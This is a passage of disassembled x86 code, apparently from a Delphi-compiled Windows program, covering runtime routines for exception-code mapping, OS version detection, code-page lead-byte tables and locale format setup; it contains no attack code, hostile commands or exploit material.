; ---------------------------------------------------------------------------

loc_41418D:				; CODE XREF: sub_41412C+49j
		mov	al, 5
		retn
; ---------------------------------------------------------------------------

loc_414190:				; CODE XREF: sub_41412C+9j
					; sub_41412C+2Fj
		mov	al, 6
		retn
; ---------------------------------------------------------------------------

loc_414193:				; CODE XREF: sub_41412C+12j
		mov	al, 7
		retn
; ---------------------------------------------------------------------------

loc_414196:				; CODE XREF: sub_41412C+31j
		mov	al, 8
		retn
; ---------------------------------------------------------------------------

loc_414199:				; CODE XREF: sub_41412C+23j
					; sub_41412C+43j
		mov	al, 9
		retn
; ---------------------------------------------------------------------------

loc_41419C:				; CODE XREF: sub_41412C+19j
		mov	al, 0Bh
		retn
; ---------------------------------------------------------------------------

loc_41419F:				; CODE XREF: sub_41412C+3Cj
		mov	al, 0Ch
		retn
; ---------------------------------------------------------------------------

loc_4141A2:				; CODE XREF: sub_41412C+57j
		mov	al, 0Dh
		retn
; ---------------------------------------------------------------------------

loc_4141A5:				; CODE XREF: sub_41412C+52j
		mov	al, 0Eh
		retn
; ---------------------------------------------------------------------------

loc_4141A8:				; CODE XREF: sub_41412C+25j
					; sub_41412C+33j ...
		mov	al, 16h
		retn
sub_41412C	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_4141AC	proc near		; DATA XREF: sub_41446C+56o
		push	ebx
		mov	ebx, eax
		mov	eax, ebx
		call	sub_41412C
		and	eax, 0FFh
		mov	eax, ds:dword_416C38[eax*8]
		pop	ebx
		retn
sub_4141AC	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_4141C4	proc near		; CODE XREF: sub_414390+54p

var_170		= dword	ptr -170h
var_16C		= dword	ptr -16Ch
var_168		= byte ptr -168h
var_164		= dword	ptr -164h
var_160		= byte ptr -160h
var_15C		= dword	ptr -15Ch
var_158		= byte ptr -158h
var_154		= dword	ptr -154h
var_150		= dword	ptr -150h
var_14C		= dword	ptr -14Ch
var_148		= dword	ptr -148h
var_144		= byte ptr -144h
var_140		= dword	ptr -140h
var_13C		= byte ptr -13Ch
var_138		= dword	ptr -138h
var_134		= byte ptr -134h
var_130		= dword	ptr -130h
var_12C		= byte ptr -12Ch
Filename	= byte ptr -125h
Buffer		= _MEMORY_BASIC_INFORMATION ptr	-20h
var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		add	esp, 0FFFFFE90h
		push	ebx
		push	esi
		xor	eax, eax
		mov	[ebp+var_170], eax
		mov	[ebp+var_14C], eax
		mov	[ebp+var_154], eax
		mov	[ebp+var_150], eax
		mov	[ebp+var_4], eax
		xor	eax, eax
		push	ebp
		push	offset loc_41437F
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		mov	eax, [ebp+arg_0]
		mov	ebx, [eax-4]
		cmp	dword ptr [ebx+14h], 0
		jnz	short loc_414215
		lea	edx, [ebp+var_4]
		mov	eax, ds:off_416E7C
		call	sub_404D54
		jmp	short loc_414222
; ---------------------------------------------------------------------------

loc_414215:				; CODE XREF: sub_4141C4+40j
		lea	edx, [ebp+var_4]
		mov	eax, ds:off_416E0C
		call	sub_404D54

loc_414222:				; CODE XREF: sub_4141C4+4Fj
		mov	esi, [ebx+18h]
		push	1Ch		; dwLength
		lea	eax, [ebp+Buffer]
		push	eax		; lpBuffer
		mov	eax, [ebx+0Ch]
		push	eax		; lpAddress
		call	VirtualQuery
		cmp	[ebp+Buffer.State], 1000h
		jnz	loc_4142F4
		push	105h		; nSize
		lea	eax, [ebp+Filename]
		push	eax		; lpFilename
		mov	eax, [ebp+Buffer.AllocationBase]
		push	eax		; hModule
		call	GetModuleFileNameA_0
		test	eax, eax
		jz	loc_4142F4
		mov	eax, [ebx+0Ch]
		mov	[ebp+var_148], eax
		mov	[ebp+var_144], 5
		lea	eax, [ebp+var_150]
		lea	edx, [ebp+Filename]
		mov	ecx, 105h
		call	sub_403BF8
		mov	eax, [ebp+var_150]
		lea	edx, [ebp+var_14C]
		call	sub_412A18
		mov	eax, [ebp+var_14C]
		mov	[ebp+var_140], eax
		mov	[ebp+var_13C], 0Bh
		mov	eax, [ebp+var_4]
		mov	[ebp+var_138], eax
		mov	[ebp+var_134], 0Bh
		mov	[ebp+var_130], esi
		mov	[ebp+var_12C], 5
		lea	eax, [ebp+var_148]
		push	eax
		push	3
		lea	edx, [ebp+var_154]
		mov	eax, ds:off_416E34
		call	sub_404D54
		mov	ecx, [ebp+var_154]
		mov	dl, 1
		mov	eax, off_41248C
		call	sub_413DEC
		mov	ebx, eax
		jmp	short loc_41434E
; ---------------------------------------------------------------------------

loc_4142F4:				; CODE XREF: sub_4141C4+77j
					; sub_4141C4+94j
		mov	eax, [ebx+0Ch]
		mov	[ebp+var_16C], eax
		mov	[ebp+var_168], 5
		mov	eax, [ebp+var_4]
		mov	[ebp+var_164], eax
		mov	[ebp+var_160], 0Bh
		mov	[ebp+var_15C], esi
		mov	[ebp+var_158], 5
		lea	eax, [ebp+var_16C]
		push	eax
		push	2
		lea	edx, [ebp+var_170]
		mov	eax, ds:off_416E10
		call	sub_404D54
		mov	ecx, [ebp+var_170]
		mov	dl, 1
		mov	eax, off_41248C
		call	sub_413DEC
		mov	ebx, eax

loc_41434E:				; CODE XREF: sub_4141C4+12Ej
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_414386

loc_41435B:				; CODE XREF: sub_4141C4+1C0j
		lea	eax, [ebp+var_170]
		call	sub_403994
		lea	eax, [ebp+var_154]
		mov	edx, 3
		call	sub_4039B8
		lea	eax, [ebp+var_4]
		call	sub_403994
		retn
; ---------------------------------------------------------------------------

loc_41437F:				; DATA XREF: sub_4141C4+2Bo
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_41435B
; ---------------------------------------------------------------------------

loc_414386:				; CODE XREF: sub_4141C4+1BAj
					; DATA XREF: sub_4141C4+192o
		mov	eax, ebx
		pop	esi
		pop	ebx
		mov	esp, ebp
		pop	ebp
		retn
sub_4141C4	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_414390	proc near		; DATA XREF: sub_41446C+61o

var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_8		= byte ptr -8
var_4		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		add	esp, 0FFFFFFF0h
		push	ebx
		xor	edx, edx
		mov	[ebp+var_10], edx
		mov	[ebp+var_4], eax
		xor	eax, eax
		push	ebp
		push	offset loc_41444B
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		mov	eax, [ebp+var_4]
		call	sub_41412C
		and	eax, 0FFh
		mov	edx, eax
		add	edx, 0FFFFFFFDh
		sub	edx, 8
		jb	short loc_4143CC
		jz	short loc_4143E3
		dec	edx
		sub	edx, 0Ah
		jnb	short loc_4143EE

loc_4143CC:				; CODE XREF: sub_414390+32j
		lea	eax, dword_416C38[eax*8]
		mov	ecx, [eax+4]
		mov	eax, [eax]
		mov	dl, 1
		call	sub_413DB0
		mov	ebx, eax
		jmp	short loc_41441E
; ---------------------------------------------------------------------------

loc_4143E3:				; CODE XREF: sub_414390+34j
		push	ebp
		call	sub_4141C4
		pop	ecx
		mov	ebx, eax
		jmp	short loc_41441E
; ---------------------------------------------------------------------------

loc_4143EE:				; CODE XREF: sub_414390+3Aj
		mov	eax, [ebp+var_4]
		mov	eax, [eax]
		mov	[ebp+var_C], eax
		mov	[ebp+var_8], 0
		lea	eax, [ebp+var_C]
		push	eax
		push	0
		lea	edx, [ebp+var_10]
		mov	eax, ds:off_416D2C
		call	sub_404D54
		mov	ecx, [ebp+var_10]
		mov	dl, 1
		mov	eax, off_411FFC
		call	sub_413DEC
		mov	ebx, eax

loc_41441E:				; CODE XREF: sub_414390+51j
					; sub_414390+5Cj
		mov	eax, ebx
		mov	edx, off_411FA4
		call	sub_402D9C
		test	al, al
		jz	short loc_414435
		mov	eax, [ebp+var_4]
		mov	[ebx+0Ch], eax

loc_414435:				; CODE XREF: sub_414390+9Dj
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_414452

loc_414442:				; CODE XREF: sub_414390+C0j
		lea	eax, [ebp+var_10]
		call	sub_403994
		retn
; ---------------------------------------------------------------------------

loc_41444B:				; DATA XREF: sub_414390+12o
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_414442
; ---------------------------------------------------------------------------

loc_414452:				; CODE XREF: sub_414390+BAj
					; DATA XREF: sub_414390+ADo
		mov	eax, ebx
		pop	ebx
		mov	esp, ebp
		pop	ebp
		retn
sub_414390	endp

; ---------------------------------------------------------------------------
		align 4

loc_41445C:				; DATA XREF: sub_41446C+3Eo
		call	sub_413CE8
		mov	eax, 1
		call	sub_40397C
; ---------------------------------------------------------------------------
		retn

; =============== S U B	R O U T	I N E =======================================


sub_41446C	proc near		; CODE XREF: sub_41520C:loc_415252p
		mov	ecx, ds:off_416D64
		mov	dl, 1
		mov	eax, off_411EF0
		call	sub_413E6C
		mov	ds:dword_41780C, eax
		mov	ecx, ds:off_416DF4
		mov	dl, 1
		mov	eax, off_412378
		call	sub_413E6C
		mov	ds:dword_417810, eax
		mov	eax, ds:off_416D34
		mov	dword ptr [eax], offset	sub_413FE8
		mov	eax, ds:off_416D90
		mov	dword ptr [eax], offset	loc_41445C
		mov	eax, ds:off_416D54
		mov	edx, off_411E2C
		mov	[eax], edx
		mov	eax, ds:off_416D88
		mov	dword ptr [eax], offset	sub_4141AC
		mov	eax, ds:off_416D94
		mov	dword ptr [eax], offset	sub_414390
		mov	eax, offset sub_4140F8
		mov	edx, ds:off_416E04
		mov	[edx], eax
		mov	eax, offset loc_414114
		mov	edx, ds:off_416D28
		mov	[edx], eax
		retn
sub_41446C	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================


sub_4144F0	proc near		; CODE XREF: sub_41508C+2Cp
		cmp	ds:dword_41780C, 0
		jz	short loc_414513
		mov	eax, ds:dword_41780C
		mov	byte ptr [eax+0Ch], 1
		mov	eax, ds:dword_41780C
		mov	edx, [eax]
		call	dword ptr [edx-8]
		xor	eax, eax
		mov	ds:dword_41780C, eax

loc_414513:				; CODE XREF: sub_4144F0+7j
		cmp	ds:dword_417810, 0
		jz	short loc_414536
		mov	eax, ds:dword_417810
		mov	byte ptr [eax+0Ch], 1
		mov	eax, ds:dword_417810
		call	sub_402D18
		xor	eax, eax
		mov	ds:dword_417810, eax

loc_414536:				; CODE XREF: sub_4144F0+2Aj
		mov	eax, ds:off_416D34
		xor	edx, edx
		mov	[eax], edx
		mov	eax, ds:off_416D90
		xor	edx, edx
		mov	[eax], edx
		mov	eax, ds:off_416D54
		xor	edx, edx
		mov	[eax], edx
		mov	eax, ds:off_416D88
		xor	edx, edx
		mov	[eax], edx
		mov	eax, ds:off_416D94
		xor	edx, edx
		mov	[eax], edx
		mov	eax, ds:off_416E04
		xor	edx, edx
		mov	[eax], edx
		retn
sub_4144F0	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================


sub_414570	proc near		; CODE XREF: sub_41520C+4Bp

var_94		= dword	ptr -94h
var_90		= dword	ptr -90h
var_8C		= dword	ptr -8Ch
var_88		= dword	ptr -88h
var_84		= dword	ptr -84h
var_80		= byte ptr -80h

		add	esp, 0FFFFFF6Ch
		mov	[esp+94h+var_94], 94h
		push	esp		; lpVersionInformation
		call	GetVersionExA
		test	eax, eax
		jz	short loc_4145D7
		mov	eax, [esp+94h+var_84]
		mov	ds:dword_416B24, eax
		mov	eax, [esp+94h+var_90]
		mov	ds:dword_416B28, eax
		mov	eax, [esp+94h+var_8C]
		mov	ds:dword_416B2C, eax
		cmp	ds:dword_416B24, 1
		jnz	short loc_4145BB
		mov	eax, [esp+94h+var_88]
		and	eax, 0FFFFh
		mov	ds:dword_416B30, eax
		jmp	short loc_4145C4
; ---------------------------------------------------------------------------

loc_4145BB:				; CODE XREF: sub_414570+39j
		mov	eax, [esp+94h+var_88]
		mov	ds:dword_416B30, eax

loc_4145C4:				; CODE XREF: sub_414570+49j
		mov	eax, offset dword_416B34
		lea	edx, [esp+94h+var_80]
		mov	ecx, 80h
		call	sub_403BF8

loc_4145D7:				; CODE XREF: sub_414570+15j
		add	esp, 94h
		retn
sub_414570	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================


sub_4145E0	proc near		; CODE XREF: sub_414658+1Bp
					; sub_41467C+Bp
		push	esi
		push	edi
		mov	edi, edx
		xor	edx, edx
		test	eax, eax
		jz	short loc_414650
		cmp	byte ptr [eax+edi], 0
		jz	short loc_414650
		test	edi, edi
		jnz	short loc_414608
		mov	al, [eax]
		and	eax, 0FFh
		bt	ds:dword_416B38, eax
		jnb	short loc_414650
		mov	dl, 1
		jmp	short loc_414650
; ---------------------------------------------------------------------------

loc_414608:				; CODE XREF: sub_4145E0+12j
		mov	esi, edi
		dec	esi
		jmp	short loc_41460E
; ---------------------------------------------------------------------------

loc_41460D:				; CODE XREF: sub_4145E0+42j
		dec	esi

loc_41460E:				; CODE XREF: sub_4145E0+2Bj
		test	esi, esi
		jl	short loc_414624
		mov	cl, [eax+esi]
		and	ecx, 0FFh
		bt	ds:dword_416B38, ecx
		jb	short loc_41460D

loc_414624:				; CODE XREF: sub_4145E0+30j
		mov	ecx, edi
		sub	ecx, esi
		and	ecx, 80000001h
		jns	short loc_414635
		dec	ecx
		or	ecx, 0FFFFFFFEh
		inc	ecx

loc_414635:				; CODE XREF: sub_4145E0+4Ej
		test	ecx, ecx
		jnz	short loc_41463D
		mov	dl, 2
		jmp	short loc_414650
; ---------------------------------------------------------------------------

loc_41463D:				; CODE XREF: sub_4145E0+57j
		mov	al, [eax+edi]
		and	eax, 0FFh
		bt	ds:dword_416B38, eax
		jnb	short loc_414650
		mov	dl, 1

loc_414650:				; CODE XREF: sub_4145E0+8j
					; sub_4145E0+Ej ...
		mov	eax, edx
		pop	edi
		pop	esi
		retn
sub_4145E0	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_414658	proc near		; CODE XREF: sub_4129C8+37p
		push	ebx
		push	esi
		mov	esi, edx
		mov	ebx, eax
		xor	eax, eax
		cmp	byte ptr ds:dword_4177C4, 0
		jz	short loc_414678
		mov	eax, ebx
		call	sub_403E24
		mov	edx, esi
		dec	edx
		call	sub_4145E0

loc_414678:				; CODE XREF: sub_414658+Fj
		pop	esi
		pop	ebx
		retn
sub_414658	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_41467C	proc near		; CODE XREF: sub_412B9C+1Bp
					; sub_414718+1Cp
		xor	ecx, ecx
		cmp	byte ptr ds:dword_4177C4, 0
		jz	short loc_41468E
		call	sub_4145E0
		mov	ecx, eax

loc_41468E:				; CODE XREF: sub_41467C+9j
		mov	eax, ecx
		retn
sub_41467C	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_414694	proc near		; CODE XREF: sub_4146B4+31p
		push	ebx
		mov	ebx, eax
		cmp	byte ptr ds:dword_4177C4, 0
		jz	short loc_4146AA
		push	ebx		; lpsz
		call	CharNextA_0
		sub	eax, ebx
		pop	ebx
		retn
; ---------------------------------------------------------------------------

loc_4146AA:				; CODE XREF: sub_414694+Aj
		mov	eax, 1
		pop	ebx
		retn
sub_414694	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_4146B4	proc near		; CODE XREF: sub_41392C+D1p
		push	ebx
		push	esi
		mov	esi, edx
		mov	ebx, eax
		mov	eax, 1
		cmp	byte ptr ds:dword_4177C4, 0
		jz	short loc_4146EA
		mov	dl, [ebx+esi-1]
		and	edx, 0FFh
		bt	ds:dword_416B38, edx
		jnb	short loc_4146EA
		mov	eax, ebx
		call	sub_403E24
		add	eax, esi
		dec	eax
		call	sub_414694

loc_4146EA:				; CODE XREF: sub_4146B4+12j
					; sub_4146B4+25j
		pop	esi
		pop	ebx
		retn
sub_4146B4	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================


sub_4146F0	proc near		; CODE XREF: sub_413B60+7Ep
		push	ebx
		push	esi
		mov	ebx, edx
		mov	edx, ebx
		call	sub_414718
		mov	esi, eax
		test	bl, bl
		jz	short loc_414713
		test	eax, eax
		jz	short loc_414713

loc_414705:				; CODE XREF: sub_4146F0+21j
		mov	esi, eax
		inc	eax
		mov	edx, ebx
		call	sub_414718
		test	eax, eax
		jnz	short loc_414705

loc_414713:				; CODE XREF: sub_4146F0+Fj
					; sub_4146F0+13j
		mov	eax, esi
		pop	esi
		pop	ebx
		retn
sub_4146F0	endp


; =============== S U B	R O U T	I N E =======================================


sub_414718	proc near		; CODE XREF: sub_4146F0+6p
					; sub_4146F0+1Ap
		push	ebx
		push	esi
		push	edi
		mov	ebx, edx
		mov	esi, eax
		mov	edx, ebx
		mov	eax, esi
		call	sub_412B88
		mov	edi, eax
		test	edi, edi
		jz	short loc_414752

loc_41472E:				; CODE XREF: sub_414718+38j
		mov	edx, edi
		sub	edx, esi
		mov	eax, esi
		call	sub_41467C
		sub	al, 1
		jb	short loc_414752
		jz	short loc_414741
		jmp	short loc_414742
; ---------------------------------------------------------------------------

loc_414741:				; CODE XREF: sub_414718+25j
		inc	edi

loc_414742:				; CODE XREF: sub_414718+27j
		inc	edi
		mov	edx, ebx
		mov	eax, edi
		call	sub_412B88
		mov	edi, eax
		test	edi, edi
		jnz	short loc_41472E

loc_414752:				; CODE XREF: sub_414718+14j
					; sub_414718+23j
		mov	eax, edi
		pop	edi
		pop	esi
		pop	ebx
		retn
sub_414718	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_414758	proc near		; CODE XREF: sub_4147CC+13p

var_C		= dword	ptr -0Ch
LCData		= byte ptr -7

		push	ebp
		mov	ebp, esp
		add	esp, 0FFFFFFF4h
		push	ebx
		xor	edx, edx
		mov	[ebp+var_C], edx
		xor	edx, edx
		push	ebp
		push	offset loc_4147BC
		push	dword ptr fs:[edx]
		mov	fs:[edx], esp
		push	7		; cchData
		lea	edx, [ebp+LCData]
		push	edx		; lpLCData
		push	1004h		; LCType
		push	eax		; Locale
		call	GetLocaleInfoA_0
		lea	eax, [ebp+var_C]
		lea	edx, [ebp+LCData]
		mov	ecx, 7
		call	sub_403BF8
		mov	eax, [ebp+var_C]
		push	eax
		call	GetACP
		mov	edx, eax
		pop	eax
		call	sub_412998
		mov	ebx, eax
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_4147C3

loc_4147B3:				; CODE XREF: sub_414758+69j
		lea	eax, [ebp+var_C]
		call	sub_403994
		retn
; ---------------------------------------------------------------------------

loc_4147BC:				; DATA XREF: sub_414758+Fo
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_4147B3
; ---------------------------------------------------------------------------

loc_4147C3:				; CODE XREF: sub_414758+63j
					; DATA XREF: sub_414758+56o
		mov	eax, ebx
		pop	ebx
		mov	esp, ebp
		pop	ebp
		retn
sub_414758	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_4147CC	proc near		; CODE XREF: sub_414844+93p
					; sub_414844+145p

var_1		= byte ptr -1
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		push	ecx
		push	ebx
		push	esi
		push	edi
		mov	edi, [ebp+arg_0]
		add	edi, 0FFFFFFECh
		push	edi		; lpCPInfo
		mov	eax, ds:Locale
		call	sub_414758
		push	eax		; CodePage
		call	GetCPInfo
		xor	esi, esi
		jmp	short loc_414817
; ---------------------------------------------------------------------------

loc_4147EE:				; CODE XREF: sub_4147CC+58j
		mov	al, [edi+esi+6]
		mov	bl, [edi+esi+7]
		sub	bl, al
		jb	short loc_414814
		inc	ebx
		mov	[ebp+var_1], al

loc_4147FE:				; CODE XREF: sub_4147CC+46j
		mov	al, [ebp+var_1]
		and	eax, 0FFh
		bts	ds:dword_416B38, eax
		inc	[ebp+var_1]
		dec	bl
		jnz	short loc_4147FE

loc_414814:				; CODE XREF: sub_4147CC+2Cj
		add	esi, 2

loc_414817:				; CODE XREF: sub_4147CC+20j
		cmp	esi, 0Ch
		jge	short loc_414826
		mov	al, [edi+esi+6]
		or	al, [edi+esi+7]
		jnz	short loc_4147EE

loc_414826:				; CODE XREF: sub_4147CC+4Ej
		pop	edi
		pop	esi
		pop	ebx
		pop	ecx
		pop	ebp
		retn
sub_4147CC	endp


; =============== S U B	R O U T	I N E =======================================


sub_41482C	proc near		; CODE XREF: sub_414844+76p
		mov	eax, ds:dword_4177BC
		cmp	eax, 1Fh
		ja	short loc_41483D
		bt	ds:dword_416D00, eax

loc_41483D:				; CODE XREF: sub_41482C+8j
		setb	al
		retn
sub_41482C	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_414844	proc near		; CODE XREF: sub_4149B8+1Ep

CharType	= word ptr -196h
SrcStr		= byte ptr -94h

		push	ebp
		mov	ebp, esp
		add	esp, 0FFFFFE68h
		push	ebx
		push	esi
		push	edi
		mov	ds:Locale, 409h
		mov	ds:dword_4177BC, 9
		mov	ds:dword_4177C0, 1
		call	GetThreadLocale_0
		test	eax, eax
		jz	short loc_41487C
		mov	ds:Locale, eax

loc_41487C:				; CODE XREF: sub_414844+31j
		test	ax, ax
		jz	short loc_41489C
		mov	edx, eax
		and	dx, 3FFh
		movzx	edx, dx
		mov	ds:dword_4177BC, edx
		movzx	eax, ax
		shr	eax, 0Ah
		mov	ds:dword_4177C0, eax

loc_41489C:				; CODE XREF: sub_414844+3Bj
		mov	esi, offset dword_414998
		mov	edi, offset dword_416B38
		mov	ecx, 8
		rep movsd
		cmp	ds:dword_416B24, 2
		jnz	loc_414961
		call	sub_41482C
		test	al, al
		jz	short loc_4148D6
		mov	byte ptr ds:dword_4177C4+1, 0
		mov	byte ptr ds:dword_4177C4, 0
		jmp	loc_41498F
; ---------------------------------------------------------------------------

loc_4148D6:				; CODE XREF: sub_414844+7Dj
		push	ebp
		call	sub_4147CC
		pop	ecx
		mov	eax, offset dword_416B38
		mov	edx, offset dword_414998
		mov	cl, 20h
		call	sub_4028B4
		setnz	bl
		mov	byte ptr ds:dword_4177C4, bl
		test	bl, bl
		jz	short loc_414907
		mov	byte ptr ds:dword_4177C4+1, 0
		jmp	loc_41498F
; ---------------------------------------------------------------------------

loc_414907:				; CODE XREF: sub_414844+B5j
		mov	eax, 80h
		lea	edx, [ebp+SrcStr]

loc_414912:				; CODE XREF: sub_414844+D7j
		mov	[edx], al
		inc	eax
		inc	edx
		cmp	eax, 100h
		jnz	short loc_414912
		lea	eax, [ebp+SrcStr]
		lea	edx, [ebp+CharType]
		push	edx		; lpCharType
		push	80h		; cchSrc
		push	eax		; lpSrcStr
		push	2		; dwInfoType
		mov	eax, ds:Locale
		push	eax		; Locale
		call	GetStringTypeExA
		mov	eax, 80h
		lea	edx, [ebp+CharType]

loc_414948:				; CODE XREF: sub_414844+119j
		cmp	word ptr [edx],	2
		setz	cl
		mov	byte ptr ds:dword_4177C4+1, cl
		test	cl, cl
		jnz	short loc_41498F
		add	edx, 2
		dec	eax
		jnz	short loc_414948
		jmp	short loc_41498F
; ---------------------------------------------------------------------------

loc_414961:				; CODE XREF: sub_414844+70j
		push	4Ah		; nIndex
		call	GetSystemMetrics
		test	eax, eax
		setnz	al
		mov	byte ptr ds:dword_4177C4+1, al
		push	2Ah		; nIndex
		call	GetSystemMetrics
		test	eax, eax
		setnz	bl
		mov	byte ptr ds:dword_4177C4, bl
		test	bl, bl
		jz	short loc_41498F
		push	ebp
		call	sub_4147CC
		pop	ecx

loc_41498F:				; CODE XREF: sub_414844+8Dj
					; sub_414844+BEj ...
		pop	edi
		pop	esi
		pop	ebx
		mov	esp, ebp
		pop	ebp
		retn
sub_414844	endp

; ---------------------------------------------------------------------------
		align 4
dword_414998	dd 8 dup(0)		; DATA XREF: sub_414844:loc_41489Co
					; sub_414844+9Eo

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_4149B8	proc near		; CODE XREF: sub_41520C+55p

var_40		= dword	ptr -40h
var_3C		= dword	ptr -3Ch
var_38		= dword	ptr -38h
var_34		= dword	ptr -34h
var_30		= dword	ptr -30h
var_2C		= dword	ptr -2Ch
var_28		= dword	ptr -28h
var_24		= dword	ptr -24h
var_20		= dword	ptr -20h
var_1C		= dword	ptr -1Ch
var_18		= dword	ptr -18h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_4		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		mov	ecx, 8

loc_4149C0:				; CODE XREF: sub_4149B8+Dj
		push	0
		push	0
		dec	ecx
		jnz	short loc_4149C0
		push	ebx
		xor	eax, eax
		push	ebp
		push	offset loc_414C83
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		call	sub_414844
		call	sub_4136A4
		cmp	byte ptr ds:dword_4177C4, 0
		jz	short loc_4149EE
		call	sub_41387C

loc_4149EE:				; CODE XREF: sub_4149B8+2Fj
		call	GetThreadLocale_0
		mov	ebx, eax
		lea	eax, [ebp+var_10]
		push	eax
		xor	ecx, ecx
		mov	edx, 14h
		mov	eax, ebx
		call	sub_4135F4
		mov	edx, [ebp+var_10]
		mov	eax, offset dword_4176F8
		call	sub_4039E8
		lea	eax, [ebp+var_14]
		push	eax
		mov	ecx, offset dword_414C98
		mov	edx, 1Bh
		mov	eax, ebx
		call	sub_4135F4
		mov	eax, [ebp+var_14]
		xor	edx, edx
		call	sub_412998
		mov	ds:byte_4176FC,	al
		lea	eax, [ebp+var_18]
		push	eax
		mov	ecx, offset dword_414C98
		mov	edx, 1Ch
		mov	eax, ebx
		call	sub_4135F4
		mov	eax, [ebp+var_18]
		xor	edx, edx
		call	sub_412998
		mov	ds:byte_4176FD,	al
		mov	cl, 2Ch
		mov	edx, 0Fh
		mov	eax, ebx
		call	sub_413640
		mov	ds:byte_4176FE,	al
		mov	cl, 2Eh
		mov	edx, 0Eh
		mov	eax, ebx
		call	sub_413640
		mov	ds:byte_4176FF,	al
		lea	eax, [ebp+var_1C]
		push	eax
		mov	ecx, offset dword_414C98
		mov	edx, 19h
		mov	eax, ebx
		call	sub_4135F4
		mov	eax, [ebp+var_1C]
		xor	edx, edx
		call	sub_412998
		mov	ds:byte_417700,	al
		mov	cl, 2Fh
		mov	edx, 1Dh
		mov	eax, ebx
		call	sub_413640
		mov	ds:byte_417701,	al
		lea	eax, [ebp+var_24]
		push	eax
		mov	ecx, offset dword_414CA4
		mov	edx, 1Fh
		mov	eax, ebx
		call	sub_4135F4
		mov	eax, [ebp+var_24]
		lea	edx, [ebp+var_20]
		call	sub_41392C
		mov	edx, [ebp+var_20]
		mov	eax, offset dword_417704
		call	sub_4039E8
		lea	eax, [ebp+var_2C]
		push	eax
		mov	ecx, offset dword_414CB4
		mov	edx, 20h
		mov	eax, ebx
		call	sub_4135F4
		mov	eax, [ebp+var_2C]
		lea	edx, [ebp+var_28]
		call	sub_41392C
		mov	edx, [ebp+var_28]
		mov	eax, offset dword_417708
		call	sub_4039E8
		mov	cl, 3Ah
		mov	edx, 1Eh
		mov	eax, ebx
		call	sub_413640
		mov	ds:byte_41770C,	al
		lea	eax, [ebp+var_30]
		push	eax
		mov	ecx, offset dword_414CCC
		mov	edx, 28h
		mov	eax, ebx
		call	sub_4135F4
		mov	edx, [ebp+var_30]
		mov	eax, offset dword_417710
		call	sub_4039E8
		lea	eax, [ebp+var_34]
		push	eax
		mov	ecx, offset dword_414CD8
		mov	edx, 29h
		mov	eax, ebx
		call	sub_4135F4
		mov	edx, [ebp+var_34]
		mov	eax, offset dword_417714
		call	sub_4039E8
		lea	eax, [ebp+var_8]
		call	sub_403994
		lea	eax, [ebp+var_C]
		call	sub_403994
		lea	eax, [ebp+var_38]
		push	eax
		mov	ecx, offset dword_414C98
		mov	edx, 25h
		mov	eax, ebx
		call	sub_4135F4
		mov	eax, [ebp+var_38]
		xor	edx, edx
		call	sub_412998
		test	eax, eax
		jnz	short loc_414BAC
		lea	eax, [ebp+var_4]
		mov	edx, offset dword_414CE4
		call	sub_403A2C
		jmp	short loc_414BB9
; ---------------------------------------------------------------------------

loc_414BAC:				; CODE XREF: sub_4149B8+1E3j
		lea	eax, [ebp+var_4]
		mov	edx, offset dword_414CF0
		call	sub_403A2C

loc_414BB9:				; CODE XREF: sub_4149B8+1F2j
		lea	eax, [ebp+var_3C]
		push	eax
		mov	ecx, offset dword_414C98
		mov	edx, 23h
		mov	eax, ebx
		call	sub_4135F4
		mov	eax, [ebp+var_3C]
		xor	edx, edx
		call	sub_412998
		test	eax, eax
		jnz	short loc_414C1B
		lea	eax, [ebp+var_40]
		push	eax
		mov	ecx, offset dword_414C98
		mov	edx, 1005h
		mov	eax, ebx
		call	sub_4135F4
		mov	eax, [ebp+var_40]
		xor	edx, edx
		call	sub_412998
		test	eax, eax
		jnz	short loc_414C0E
		lea	eax, [ebp+var_C]
		mov	edx, offset dword_414CFC
		call	sub_403A2C
		jmp	short loc_414C1B
; ---------------------------------------------------------------------------

loc_414C0E:				; CODE XREF: sub_4149B8+245j
		lea	eax, [ebp+var_8]
		mov	edx, offset dword_414D0C
		call	sub_403A2C

loc_414C1B:				; CODE XREF: sub_4149B8+222j
					; sub_4149B8+254j
